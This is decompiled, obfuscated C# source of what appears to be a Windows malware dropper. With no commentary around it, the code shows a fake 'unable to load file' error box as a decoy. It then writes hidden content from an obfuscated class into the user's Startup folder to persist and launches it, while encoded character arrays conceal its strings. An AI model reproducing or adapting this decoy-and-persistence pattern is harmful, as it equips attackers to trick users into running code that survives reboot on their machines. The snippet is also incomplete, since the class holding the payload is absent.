using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

internal sealed class Class1
{
	internal sealed class Class2
	{
		internal sealed class Class3
		{
			[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 2884)]
			private struct Struct0
			{
			}

			private static readonly char[] char_0;

			private static readonly char[] char_1;

			private static readonly string[] string_0;

			internal static byte byte_0/* Not supported: data(00) */;

			static Class3()
			{
				char_1 = new char[1442];
				char[] array = new char[8];
				array[1] = '㬭';
				array[3] = '㘤';
				array[7] = '㬁';
				array[5] = 'ᜎ';
				array[6] = 'ቖ';
				array[2] = 'ᒓ';
				array[0] = 'ϸ';
				array[4] = 'ᓼ';
				string_0 = new string[96];
				char_0 = array;
			}
		}
	}

	internal sealed class Class4
	{
	}

	private static void Main(string[] args)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Unable to load file, an error occurred while loading a higher quality version of this it", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		Class0 @class = new Class0();
		@class.method_1();
		string text = @class.string_1 + @class.string_0 + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\oxu.txt";
		try
		{
			File.WriteAllLines(text, @class.string_2);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
		Environment.Exit(0);
	}
}
